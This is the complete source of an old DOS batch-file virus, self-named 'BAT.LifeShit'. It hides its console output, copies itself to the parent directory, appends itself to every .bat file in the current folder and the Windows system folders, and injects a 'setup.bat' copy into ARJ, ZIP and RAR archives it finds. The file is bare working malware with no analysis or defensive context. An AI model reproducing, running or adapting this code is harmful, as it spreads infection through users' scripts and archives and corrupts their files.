rem  Hi From BAT.LifeShit virus!  :)
@ctty nul
set Life=Shit
copy %0 ..\%0
if "#%1"=="#find" goto find
if "#%1"=="#infect" goto infect
copy %0 setup.bat
if "#%1"=="#arj" goto arj
if "#%1"=="#zip" goto zip
if "#%1"=="#rar" goto rar
:find
for %%f in (*.bat c:\windows\*.bat c:\windows\command\*.bat) do call %0 infect %%f
goto ende

:infect
if %2==%0 goto ende
@copy %2 /A + %0 /A /Y

if exist ..\%0 call ..\%0
for %%a in (*.arj) do call %0 arj %%a
for %%z in (*.zip) do call %0 zip %%z
for %%r in (*.rar) do call %0 rar %%r
goto ende

:ARJ
arj a -y %2 setup.bat
goto ende

:ZIP
pkzip %2 setup.bat
goto ende

:RAR
rar a -y %2 setup.bat

:ende
del setup.bat



